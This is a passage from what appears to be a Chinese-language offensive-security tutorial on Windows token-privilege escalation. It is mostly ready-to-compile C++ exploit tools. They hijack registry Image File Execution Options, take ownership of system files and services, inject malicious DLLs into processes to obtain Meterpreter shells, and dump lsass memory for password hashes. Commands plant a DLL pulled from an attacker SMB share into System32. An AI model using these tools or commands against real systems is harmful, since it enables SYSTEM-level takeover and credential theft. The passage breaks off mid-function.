![image-20230209111912926](C:\Users\whoami\AppData\Roaming\Typora\typora-user-images\image-20230209111912926.png)

当然，我们可以直接通过 `reg` 命令设置映像劫持，如下图所示。这是因为在 `reg` 命令内部会自动调用 `AdjustTokenPrivileges()` 函数为当前进程开启 SeRestorePrivilege 特权。

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe"
```

此外，如果我们指定 `-e` 为 ”File“，则可以写入任意文件，这里我们在系统目录中写入恶意 DLL 来劫持系统服务。这里劫持的是 Task Scheduler 服务。Task Scheduler 服务使用户可以在此计算机上配置和计划自动任务，并托管多个 Windows 系统关键任务。该服务启动后，将尝试在 C:\Windows\System32 目录中加载 WptsExtensions.dll，但是该链接库文件不存在。我们可以制作一个同名的恶意 DLL 并放入远程共享文件夹中，然后通过 SeRestorePrivilege.exe 将恶意 DLL 写入到 C:\Windows\System32 目录中，如下图所示。

```cmd
SeRestorePrivilege.exe -e File -s \\172.26.10.128\evilsmb\WptsExtensions.dll -d C:\Windows\System32\WptsExtensions.dll
```

![image-20230209115832079](C:\Users\whoami\AppData\Roaming\Typora\typora-user-images\image-20230209115832079.png)

当系统或服务重启时，目标系统上线，并且为 NT AUTHORITY\SYSTEM 权限，如下图所示。

![image-20230209120050530](C:\Users\whoami\AppData\Roaming\Typora\typora-user-images\image-20230209120050530.png)

## ## SeLoadDriverPrivilege

SeLoadDriverPrivilege 特权在 Microsoft 官方文档中被描述为 “*Load and unload device drivers*”，设备驱动程序在内核中运行的事实使之成为一个非常理想的特权。

我们的目标是在仅给定 SeLoadDriverPrivilege 特权的情况下在内核中执行任意代码，并绕过该过程中的任何驱动程序签名要求，这是一项艰巨的任务。大多数关于此特权和相关 Windows API 调用的文档都假定调用者对系统具有额外的权限，特别是写入 HKLM 注册表的部分的能力。

加载驱动程序的 Windows API 是 `NtLoadDriver()`，该函数的定义如下：

```c++
NTSYSAPI NTSTATUS NtLoadDriver(
  [in] PUNICODE_STRING DriverServiceName
);
```

其中，`DriverServiceName` 参数是一个指向驱动程序注册表项路径的 Unicode 字符串指针，如下所示。

```php
\Registry\Machine\System\CurrentControlSet\Services\DriverName
```

“DriverName” 是驱动程序名称命名的子项，在该子项下，至少应有以下两个值：

- ImagePath：格式为 `\??\C:\path\to\driver.sys` 的字符串。
- Type：应设置为 1 的 DWORD 类型值。

值得注意的是，`DriverServiceName` 参数的格式必须以 “\Registry\Machine” 开头。如果是非管理员权限，默认无法操作 HKLM 注册表项，我们可以使用指向 HKCU 的路径来代替，例如 `\Registry\User\<User SID>\`，这里的 `<User SID>` 是当前用户的 SID。

下面给出可供参考的利用代码，首先通过 `AdjustTokenPrivileges()` 函数为当前进程开启 SeLoadDriverPrivilege 特权，然后通过上述两种方法滥用该特权。

https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/















## ## SeTakeOwnershipPrivilege

SeTakeOwnershipPrivilege 特权在 Microsoft 官方文档中被描述为 “*Take ownership of files or other objects*”，该特权允许进程通过授予 WRITE_OWNER 访问权限来获得对象的所有权而无需被授予任意访问权限。

SeTakeOwnershipPrivilege 特权在攻击面上类似于 SeRestorePrivilege，由于可以接管任意对象，因此可以修改对象的 ACL。我们通过修改 Image File Execution Options 注册表或系统资源的 DACL，使我们拥有完全控制权限，并通过映像劫持、DLL 劫持或劫持服务等方法来获得本地特权提升。

滥用该特权，需要先调用一次 `SetNamedSecurityInfoW()` 函数重新设置目标对象的所有者，以获得对象的所有权，如下所示，所有者通过 Sid 来识别。

```c++
// Take owner ship
dwRes = SetNamedSecurityInfoW(
	pObjectName,
	ObjectType,
	OWNER_SECURITY_INFORMATION,
	pTokenUser->User.Sid,
	NULL,
	NULL,
	NULL
);
if (dwRes != ERROR_SUCCESS)
{
	wprintf(L"[-] SetNamedSecurityInfoW Error: [%u].\n", dwRes);
	return status;
}
wprintf(L"[*] Set the owner in the object's security descriptor.\n");
```

然后哦，我们需要一个新的 DACL 并更新到目标对象的安全描述符中，新的 DACL 将为我们授予目标对象的完全控制权限。构建 ACL 需要构建 EXPLICIT_ACCESS 对象，并使用 `SetEntriesInAclW()` 函数来构建 ACL 对象，如下所示。

```c++
ea[0].grfAccessPermissions = grfAccessPermissions;
ea[0].grfAccessMode = SET_ACCESS;
ea[0].grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
ea[0].Trustee.TrusteeType = TRUSTEE_IS_USER;
ea[0].Trustee.ptstrName = (LPWSTR)pTokenUser->User.Sid;    // Sid of owner
dwRes = SetEntriesInAclW(1, ea, pOldDACL, &pNewDACL);

if (dwRes != ERROR_SUCCESS)
{
	wprintf(L"[-] SetEntriesInAclW Error: [%u].\n", dwRes);
	return status;
}
wprintf(L"[*] Create a new access control list.\n");
```

最后，再一次调用 `SetNamedSecurityInfoW()` 函数，将上述 DACL 对象更新到目标对象中，如下所示。

```c++
// Now that we are the owner, try again to modify the object's DACL.
dwRes = SetNamedSecurityInfoW(
	pObjectName,
	ObjectType,
	DACL_SECURITY_INFORMATION,
	NULL,
	NULL,
	pNewDACL,
	NULL
);
if (dwRes != ERROR_SUCCESS)
{
	wprintf(L"[-] SetNamedSecurityInfoW Error: [%u].\n", dwRes);
	return status;
}
else
{
	wprintf(L"[*] Now that we are the owner, and modify the object's DACL.\n");
	status = TRUE;
}
```

下面给出可供参考的利用代码，首先通过 `AdjustTokenPrivileges()` 函数为当前进程开启 SeTakeOwnershipPrivilege 特权，然后通过上述过程滥用该特权。如果执行时 `-e` 参数为 “Registry”，则会接管 `Image File Execution Options` 注册表对象。如果 `-e` 参数为 “File”，则可以接管关键系统文件。

- SeTakeOwnershipPrivilege.cpp

```c++
#include <Windows.h>
#include <iostream>
#include <stdio.h>
#include <sddl.h>
#include <aclapi.h>

PTOKEN_USER GetTokenUserInformation(HANDLE hToken)
{
	DWORD dwReturnLength = 0;
	PTOKEN_USER pTokenUser = (PTOKEN_USER)malloc(sizeof(TOKEN_USER));

	// Get token information, set tokenInfo.
	if (GetTokenInformation(hToken, TokenUser, NULL, 0, &dwReturnLength) || GetLastError() == ERROR_INSUFFICIENT_BUFFER)
	{
		pTokenUser = (PTOKEN_USER)realloc(pTokenUser, dwReturnLength *= 2);
		if (!GetTokenInformation(hToken, TokenUser, pTokenUser, dwReturnLength, &dwReturnLength))
		{
			wprintf(L"[-] Failed to get token user information.\n");
			CloseHandle(hToken);
			free(pTokenUser);
			return NULL;
		}
	}
	return pTokenUser;
}

BOOL ExploitSeTakeOwnershipPrivilege(HANDLE hToken, SE_OBJECT_TYPE ObjectType, LPWSTR pObjectName, DWORD grfAccessPermissions)
{
	BOOL status = FALSE;
	PACL pOldDACL = NULL;
	PACL pNewDACL = NULL;
	EXPLICIT_ACCESS ea[1];
	PTOKEN_USER pTokenUser;
	LPWSTR stringSid;
	DWORD dwRes;

	pTokenUser = GetTokenUserInformation(hToken);

	dwRes = GetNamedSecurityInfoW(
		(LPCWSTR)pObjectName, 
		ObjectType,
		DACL_SECURITY_INFORMATION,
		NULL,
		NULL, 
		&pOldDACL, 
		NULL, 
		NULL
	);
	if (dwRes != ERROR_SUCCESS)
	{
		printf("[-] GetNamedSecurityInfoW Error: [%u].\n", dwRes);
		return status;
	}
	wprintf(L"[*] Get a copy of the security descriptor for the object.\n");

	// Take owner ship
	dwRes = SetNamedSecurityInfoW(
		pObjectName,
		ObjectType,
		OWNER_SECURITY_INFORMATION,
		pTokenUser->User.Sid,
		NULL,
		NULL,
		NULL
	);
	if (dwRes != ERROR_SUCCESS)
	{
		wprintf(L"[-] SetNamedSecurityInfoW Error: [%u].\n", dwRes);
		return status;
	}
	wprintf(L"[*] Set the owner in the object's security descriptor.\n");

	ea[0].grfAccessPermissions = grfAccessPermissions;
	ea[0].grfAccessMode = SET_ACCESS;
	ea[0].grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
	ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
	ea[0].Trustee.TrusteeType = TRUSTEE_IS_USER;
	ea[0].Trustee.ptstrName = (LPWSTR)pTokenUser->User.Sid;    // Sid of owner

	dwRes = SetEntriesInAclW(1, ea, pOldDACL, &pNewDACL);
	if (dwRes != ERROR_SUCCESS)
	{
		wprintf(L"[-] SetEntriesInAclW Error: [%u].\n", dwRes);
		return status;
	}
	wprintf(L"[*] Create a new access control list.\n");

	// Now that we are the owner, try again to modify the object's DACL.
	dwRes = SetNamedSecurityInfoW(
		pObjectName,
		ObjectType,
		DACL_SECURITY_INFORMATION,
		NULL,
		NULL,
		pNewDACL,
		NULL
	);
	if (dwRes != ERROR_SUCCESS)
	{
		wprintf(L"[-] SetNamedSecurityInfoW Error: [%u].\n", dwRes);
		return status;
	}
	else
	{
		wprintf(L"[*] Now that we are the owner, and modify the object's DACL.\n");
		status = TRUE;
	}
	return status;
}

BOOL EnableTokenPrivilege(HANDLE hToken, LPCWSTR lpName)
{
	BOOL status = FALSE;
	LUID luidValue = { 0 };
	TOKEN_PRIVILEGES tokenPrivileges;

	// Get the LUID value of the privilege for the local system
	if (!LookupPrivilegeValueW(NULL, lpName, &luidValue))
	{
		wprintf(L"[-] LookupPrivilegeValue Error: [%u].\n", GetLastError());
		return status;
	}

	// Set escalation information
	tokenPrivileges.PrivilegeCount = 1;
	tokenPrivileges.Privileges[0].Luid = luidValue;
	tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// Elevate Process Token Access
	if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(tokenPrivileges), NULL, NULL))
	{
		wprintf(L"[-] AdjustTokenPrivileges Error: [%u].\n", GetLastError());
		return status;
	}
	else
	{
		status = TRUE;
	}
	return status;
}

void PrintUsage()
{
	wprintf(
		L"Abuse of SeTakeOwnershipPrivilege by @WHOAMI (whoamianony.top)\n\n"
		L"Arguments:\n"
		L"  -h                     Show this help message and exit\n"
		L"  -e <Registry, File>    Specifies the type of object\n"
		L"  -t <ObjectName>        Specifies the name of object\n"
	);
}

int wmain(int argc, wchar_t* argv[])
{
	HANDLE hToken = NULL;
	LPCWSTR lpObjectType = L"Registry";
	LPCWSTR lpObjectName = L"MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options";
	SE_OBJECT_TYPE seObjectType = SE_REGISTRY_KEY;
	DWORD grfAccessPermissions = KEY_ALL_ACCESS;

	while ((argc > 1) && (argv[1][0] == '-'))
	{
		switch (argv[1][1])
		{
		case 'h':
			PrintUsage();
			return 0;
		case 'e':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				lpObjectType = (LPCWSTR)argv[1];
				if (!wcscmp(lpObjectType, L"Registry"))
				{
					seObjectType = SE_REGISTRY_KEY;
					grfAccessPermissions = KEY_ALL_ACCESS;
				}
				if (!wcscmp(lpObjectType, L"File"))
				{
					seObjectType = SE_FILE_OBJECT;
					grfAccessPermissions = GENERIC_ALL;
				}
			}
			break;
		case 't':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				lpObjectName = (LPCWSTR)argv[1];
			}
			break;
		default:
			wprintf(L"[-] Invalid Argument: %s.\n", argv[1]);
			PrintUsage();
			return 0;
		}

		++argv;
		--argc;
	}

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
	{
		wprintf(L"[-] OpenProcessToken Error: [%u].\n", GetLastError());
		return 0;
	}
	// Enable SeTakeOwnershipPrivilege for the current process token.
	if (EnableTokenPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME))
	{
		if (ExploitSeTakeOwnershipPrivilege(hToken, seObjectType, (LPWSTR)lpObjectName, grfAccessPermissions))
		{
			return 1;
		}
	}
}
```

将编译并生成好的 SeTakeOwnershipPrivilege.exe 上传到目标主机，执行以下命令接管 `Image File Execution Options` 注册表对象，然后直接通过 `reg` 命令设置映像劫持即可，如下图所示。

```powershell
SeTakeOwnershipPrivilege.exe -e "Registry" -t "MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
```

![image-20230214192438120](C:\Users\whoami\AppData\Roaming\Typora\typora-user-images\image-20230214192438120.png)

如下图所示，可以看到，SeTakeOwnershipPrivilege.exe 执行后 `Image File Execution Options` 注册表项的所有者变成了 Marcus 用户，并且对其拥有完全控制权限，如下图所示。

![image-20230214192003442](C:\Users\whoami\AppData\Roaming\Typora\typora-user-images\image-20230214192003442.png)

此外，如果我们指定 `-e` 为 ”File“，则可以接管任意文件。假设 TestSrv 是一个以 NT AUTHORITY\SYSTEM 权限运行的服务，其二进制文件路径为 ”C:\Program Files\TestService\TestSrv.exe“。执行以下命令，接管该服务的二进制文件并将其覆盖为攻击载荷，如下图所示。

```powershell
.\\SeTakeOwnershipPrivilege.exe -e "File" -t "C:\Program Files\TestService\TestSrv.exe"
```

![image-20230214194658736](C:\Users\whoami\AppData\Roaming\Typora\typora-user-images\image-20230214194658736.png)

当系统或服务重启时，目标系统上线，并且为 NT AUTHORITY\SYSTEM 权限，如下图所示。

![image-20230214195126644](C:\Users\whoami\AppData\Roaming\Typora\typora-user-images\image-20230214195126644.png)

## ## SeDebugPrivilege

SeDebugPrivilege 特权在 Microsoft 官方文档中被描述为 “*Debug programs*”。该特权非常强大，它允许其持有者调试另一个进程，这包括读取和写入该进程的内存。许多年来，恶意软件作者和漏洞利用程序开发人员广泛滥用了这一特权。因此，许多通过这一特权获得本地特权提升的技术将被现代端点保护解决方案标记。

滥用该特权，我们可以通过 `CreateRemoteThread()` 函数实现远程线程注入，以在高权限的系统进程中加载恶意 DLL 或者 Shellcode，并最终获得本地特权提升。此外，使用该特权还可以转储 lsass.exe 进程的内存，从而获取已登录用户哈希值。这里，我们首先介绍通过远程线程注入加载恶意 DLL。

周所周知，程序在加载一个 DLL 时，它通常会调用 [`LoadLibrary()`](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya) 函数来实现 DLL 的动态加载，该函数的声明如下所示。

```c++
HMODULE LoadLibraryW(
  [in] LPCWSTR lpLibFileName
);
```

再来看一下创建远程线程的 [`CreateRemoteThread()`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread) 函数，其用于创建在另一个进程的虚拟地址空间中运行的线程，该函数定义如下。

```c++
HANDLE CreateRemoteThread(
  [in]  HANDLE                 hProcess,
  [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  [in]  SIZE_T                 dwStackSize,
  [in]  LPTHREAD_START_ROUTINE lpStartAddress,
  [in]  LPVOID                 lpParameter,
  [in]  DWORD                  dwCreationFlags,
  [out] LPDWORD                lpThreadId
);
```

该函数需要传递目标进程空间中的线程函数的地址 `lpStartAddress`，以及传递给线程函数的参数 `lpParameter`，其中参数类型为空指针类型。

如果程序能够获取目标进程中 `LoadLibrary()` 函数的地址，并且能够获取进程空间中某个 DLL 路径字符串的地址，那么就可以将 `LoadLibrary()` 函数的地址作为线程函数的地址，这个 DLL 路径字符串作为传递给线程函数的参数。将二者一并传递给 `CreateRemoteThread()` 函数，在系统进程空间中创建一个线程，这个线程就是通过 `LoadLibrary()` 函数加载恶意 DLL。

到目前为止，远程线程注入的大致原理清晰了。那么要实现远程线程注入 DLL，还需要解决以下两个问题：

1. 目标进程空间中 `LoadLibrary()` 函数的地址是多少。
2. 如何向目标进程空间中写入 DLL 路径字符串数据。

对于第一个问题，由于 Windows 引入了基址随机化 ASLR（Address Space Layout Randomization）安全机制，所以每次开机时系统 DLL 的加载基址都不一样，从而导致了 DLL 导出函数的地址也都不一样。

但是，有些系统 DLL（例如 kernel32.dll、ntdll.dll）的加载基地址要求系统启动之后必须固定，如果系统重新启动，则其地址可以不同。也就是说，虽然进程不同，但是开机后，kernel32.dll 的加载基址在各个进程中都是相同的，因此导出函数的地址也相同。所以，自己程序空间中 `LoadLibrary()` 函数地址和其他进程空间中 `LoadLibrary()` 函数地址相同。因此，我们可以通过加载 kernel32.dll 模块来获取 `LoadLibrary()` 函数地址。

对于第二个问题，我们可以直接调用 `VirtualAllocEx()` 函数在目标进程空间中申请一块内存，然后再调用 `WriteProcessMemory()` 函数将指定的 DLL 路径写入到目标进程空间中。

下面给出可供参考的利用代码，首先通过 `AdjustTokenPrivileges()` 函数为当前进程开启 SeDebugPrivilege 特权，然后通过上述过程滥用该特权。

- SeDebugPrivilege.cpp

```c++
#include <Windows.h>
#include <iostream>
#include <stdio.h>
#include <tlhelp32.h>

DWORD GetProcessIdByName(LPCWSTR lpProcessName)
{
	// Create toolhelp snapshot.
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 process;
	ZeroMemory(&process, sizeof(process));
	process.dwSize = sizeof(process);

	// Walkthrough all processes.
	if (Process32FirstW(hSnapshot, &process))
	{
		do
		{
			// Compare process.szExeFile based on format of name, i.e., trim file path
			// trim .exe if necessary, etc.
			if (_wcsicmp(process.szExeFile, lpProcessName) == 0)
			{
				wprintf(L"[*] Got the PID of %ws: %d.\n", lpProcessName, process.th32ProcessID);
				return process.th32ProcessID;
			}
		} while (Process32NextW(hSnapshot, &process));
	}

	CloseHandle(hSnapshot);
	return 0;
}

BOOL ExploitSeDebugPrivilege(LPCWSTR lpProcessName, LPCWSTR lpDllFileName)
{
	BOOL status = FALSE;
	DWORD dwProcessId;
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	SIZE_T dwSize = 0;
	LPVOID lpDllAddr = NULL;
	FARPROC pLoadLibraryProc = NULL;

	dwProcessId = GetProcessIdByName(lpProcessName);
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
	if (hProcess == NULL)
	{
		printf("[-] OpenProcess Error: [%u].\n", GetLastError());
		return status;
	}
	
	// Allocate virtual memory space in a remote process.
	dwSize = (wcslen(lpDllFileName) + 1) * sizeof(WCHAR);
	lpDllAddr = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
	if (lpDllAddr == NULL)
	{
		printf("[-] VirtualAllocEx Error: [%u].\n", GetLastError());
		return status;
	}
	wprintf(L"[*] Allocate virtual memory space in a %ws process: 0x%016llx\n", lpProcessName, lpDllAddr);

	// Write DLL path data to the allocated memory.
	if (!WriteProcessMemory(hProcess, lpDllAddr, lpDllFileName, dwSize, NULL))
	{
		printf("[-] WriteProcessMemory Error: [%u].\n", GetLastError());
		return status;
	}
	wprintf(L"[*] Write DLL path to the allocated memory.\n");

	// Get the LoadLibraryW function address through kernel32.dll.
	pLoadLibraryProc = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
	if (pLoadLibraryProc == NULL)
	{
		printf("[-] GetProcAddress Error: [%u].\n", GetLastError());
		return status;
	}
	wprintf(L"[*] Get address of LoadLibraryW: 0x%016llx.\n", pLoadLibraryProc);

	// Use CreateRemoteThread to create a remote thread for DLL injection.
	hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryProc, lpDllAddr, 0, NULL);
	if (hThread == NULL)
	{
		printf("[-] CreateRemoteThread Error: [%u].\n", GetLastError());
		return status;
	}
	else
	{
		wprintf(L"[*] Create a remote thread for DLL injection.\n");
		status = TRUE;
	}

	WaitForSingleObject(hThread, -1);
	CloseHandle(hProcess);

	return status;
}

BOOL EnableTokenPrivilege(HANDLE hToken, LPCWSTR lpName)
{
	BOOL status = FALSE;
	LUID luidValue = { 0 };
	TOKEN_PRIVILEGES tokenPrivileges;

	// Get the LUID value of the privilege for the local system
	if (!LookupPrivilegeValueW(NULL, lpName, &luidValue))
	{
		wprintf(L"[-] LookupPrivilegeValue Error: [%u].\n", GetLastError());
		return status;
	}

	// Set escalation information
	tokenPrivileges.PrivilegeCount = 1;
	tokenPrivileges.Privileges[0].Luid = luidValue;
	tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// Elevate Process Token Access
	if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(tokenPrivileges), NULL, NULL))
	{
		wprintf(L"[-] AdjustTokenPrivileges Error: [%u].\n", GetLastError());
		return status;
	}
	else
	{
		status = TRUE;
	}
	return status;
}

void PrintUsage()
{
	wprintf(
		L"Abuse of SeDebugPrivilege by @WHOAMI (whoamianony.top)\n\n"
		L"Arguments:\n"
		L"  -h                  Show this help message and exit.\n"
		L"  -p <ProcessName>    Specifies the system process name.\n"
		L"  -m <DLL>            Specifies the malicious DLL path.\n"
	);
}

int wmain(int argc, wchar_t* argv[])
{
	HANDLE hToken = NULL;
	LPCWSTR lpProcessName = L"lsass.exe";
	LPCWSTR lpDllFileName = NULL;

	while ((argc > 1) && (argv[1][0] == '-'))
	{
		switch (argv[1][1])
		{
		case 'h':
			PrintUsage();
			return 0;
		case 'p':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				lpProcessName = (LPCWSTR)argv[1];
			}
			break;
		case 'm':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				lpDllFileName = (LPCWSTR)argv[1];
			}
			break;
		default:
			wprintf(L"[-] Invalid Argument: %s.\n", argv[1]);
			PrintUsage();
			return 0;
		}

		++argv;
		--argc;
	}

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		wprintf(L"[-] OpenProcessToken Error: [%u].\n", GetLastError());
		return 0;
	}
	// Enable SeDebugPrivilege for the current process token.
	if (EnableTokenPrivilege(hToken, SE_DEBUG_NAME))
	{
		if (ExploitSeDebugPrivilege(lpProcessName, lpDllFileName))
		{
			return 1;
		}
	}
}
```

将编译并生成好的 SeBackupPrivilege.exe 上传到目标主机，执行以下命令，将恶意的 DLL 注入 Administrator 用户的 notepad.exe 进程中，如下图所示，成功获得 Administrator 用户权限的 Meterpreter。

```powershell
SeDebugPrivilege.exe -p "notepad.exe" -m "C:\Users\Marcus\shell.dll"
```

![image-20230214231049280](C:\Users\whoami\AppData\Roaming\Typora\typora-user-images\image-20230214231049280.png)

到目前为止，我们演示的远程线程注入都是使用 Windows 标准 API 进行的，其虽然易于使用，但是可被大多数 AV/EDR 产品检测到。此外，在测试中可能会发现，我们不能成功注入到一些系统服务进程。这是因为系统存在 SESSION 0 隔离的安全机制，传统的远程注入 DLL 方法并不能突破 SESSION 0 隔离。

也为了突破 SESSION 0 隔离，我们需要使用 Windows 系统中底层的 API，也就是 Native APIs。

> 为了方便与操作系统进行交互，程序员一般使用微软推荐的标准 API（Win32 API）。标准 Windows APIs 是在 Native APIs 的基础上包装产生的。Native APIs 也被称为 Undocumented APIs，因为你通常找不到它们的官方文档。Native APIs 或 Undocumented APIs 都可以在 ntdll.dll 库中调用，我们可以通过查看其他人的代码或者别人总结的非官方文档，来查看它们的使用方法。

由于 Windows 在内核 6.0 以后引入了会话隔离机制，它在创建一个进程之后并不会立即运行，而是先挂起进程，在查看要运行的进程所在的会话层之后再决定是否恢复进程运行。经过逆向分析，可以发现 `CreateRemoteThread()` 函数内部在调用了 `NtCreateThreadEx()` 函数来创建远程线程，并且 `NtCreateThreadEx()` 的第七个参数 `CreateThreadFlags` 的值被设为了 1，他会导致线程创建完成后一直挂起无法恢复运行，这就是为什么在注入系统进程时会失败。

所以，要想成功注入系统服务进程，就需要直接调用 `NtCreateThreadEx()` 函数，并将第七个参数的值改为 0，这样线程创建完成后就会恢复运行，成功注入。

如下创建一个 Native.h，将 ntdll.dll 模块加载到我们的程序中，并定义与我们要使用的原始函数格式完全相同的函数指针，使用这些函数的基地址来初始化这些指针。对于远程线程注入来说，我们需要的函数有 `NtOpenProcess()`、`NtAllocateVirtualMemory()`、`NtWriteVirtualMemory()`、`NtCreateThreadEx()`，如下所示。

- Native.h

```c++
#pragma once

#include <Windows.h>

#define STATUS_SUCCESS 0

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#define InitializeObjectAttributes( i, o, a, r, s ) {    \
      (i)->Length = sizeof( OBJECT_ATTRIBUTES );         \
      (i)->RootDirectory = r;                            \
      (i)->Attributes = a;                               \
      (i)->ObjectName = o;                               \
      (i)->SecurityDescriptor = s;                       \
      (i)->SecurityQualityOfService = NULL;              \
}

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID {
	PVOID UniqueProcess;
	PVOID UniqueThread;
} CLIENT_ID, * PCLIENT_ID;


typedef NTSTATUS(NTAPI* _NtOpenProcess)(
	PHANDLE            ProcessHandle,
	ACCESS_MASK        DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PCLIENT_ID         ClientId
	);

typedef NTSTATUS(NTAPI* _NtAllocateVirtualMemory)(
	HANDLE             ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR          ZeroBits,
	PSIZE_T            RegionSize,
	ULONG              AllocationType,
	ULONG              Protect
	);

typedef NTSTATUS(NTAPI* _NtWriteVirtualMemory)(
	HANDLE             hProcess,
	PVOID              lpBaseAddress,
	PVOID              lpBuffer,
	SIZE_T             NumberOfBytesToRead,
	PSIZE_T            NumberOfBytesRead
	);

typedef NTSTATUS(NTAPI* _NtCreateThreadEx) (
	PHANDLE            ThreadHandle,
	ACCESS_MASK        DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	HANDLE             ProcessHandle,
	PVOID              StartRoutine,
	PVOID              Argument OPTIONAL,
	ULONG              CreateFlags,
	ULONG_PTR          ZeroBits,
	SIZE_T             StackSize OPTIONAL,
	SIZE_T             MaximumStackSize OPTIONAL,
	PVOID              AttributeList OPTIONAL
	);

_NtOpenProcess NtOpenProcess = (_NtOpenProcess)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtOpenProcess");
_NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtAllocateVirtualMemory");
_NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtWriteVirtualMemory");
_NtCreateThreadEx NtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtCreateThreadEx");
```

此外，除了远程线程注入的方法，我们还可以使用 `MiniDumpWriteDump()` 等类似的 API 转储 lsass.exe 进程的内存，从而获取已登录用户哈希值，如下所示。

```c++
status = MiniDumpWriteDump(hProcess, dwProcessId, dumpFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
		if (!status)
		{
			wprintf(L"[-] MiniDumpWriteDump Error: [%u].\n", GetLastError());
			return status;
		}
		wprintf(L"[*] Dump the memory of %ws process into %ws.\n", lpProcessName, outputFile);
```

下面给出可供参考的利用代码，首先通过 `AdjustTokenPrivileges()` 函数为当前进程开启 SeDebugPrivilege 特权，然后通过上述两种方法滥用该特权。如果执行时 `-e` 参数为 “Injection”，则执行远程线程注入，获取权限。如果 `-e` 参数为 “Mimidump”，则可以转储指定进程的内存。

- SeDebugPrivilege.cpp

```c++
#include "Native.h"
#include <iostream>
#include <DbgHelp.h>
#include <tlhelp32.h>

#pragma comment(lib, "Dbghelp.lib")

DWORD GetProcessIdByName(LPCWSTR lpProcessName)
{
	// Create toolhelp snapshot.
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 process;
	ZeroMemory(&process, sizeof(process));
	process.dwSize = sizeof(process);

	// Walkthrough all processes.
	if (Process32FirstW(hSnapshot, &process))
	{
		do
		{
			// Compare process.szExeFile based on format of name, i.e., trim file path
			// trim .exe if necessary, etc.
			if (_wcsicmp(process.szExeFile, lpProcessName) == 0)
			{
				wprintf(L"[*] Got the PID of %ws: %d.\n", lpProcessName, process.th32ProcessID);
				return process.th32ProcessID;
			}
		} while (Process32NextW(hSnapshot, &process));
	}

	CloseHandle(hSnapshot);
	return 0;
}

BOOL ExploitSeDebugPrivilege(LPCWSTR expType, LPCWSTR lpProcessName, LPCWSTR lpDllFileName, LPCWSTR lpOutputFile)
{
	BOOL status = FALSE;
	DWORD dwProcessId;
	CLIENT_ID clientId = { 0 };
	OBJECT_ATTRIBUTES ObjectAttributes;
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	SIZE_T dwSize = 0;
	LPVOID lpDllAddr = NULL;
	FARPROC pLoadLibraryProc = NULL;
	HANDLE dumpFile;

	dwProcessId = GetProcessIdByName(lpProcessName);

	ZeroMemory(&clientId, sizeof(clientId));
	clientId.UniqueProcess = UlongToHandle(dwProcessId);
	clientId.UniqueThread = NULL;

	InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
	status = NT_SUCCESS(NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &ObjectAttributes, &clientId));
	if (!status)
	{
		printf("[-] NtOpenProcess Error: [%u].\n", GetLastError());
		return status;
	}
	if (!wcscmp(expType, L"Injection"))
	{
		// Allocate virtual memory space in a remote process.
		dwSize = (wcslen(lpDllFileName) + 1) * sizeof(WCHAR);
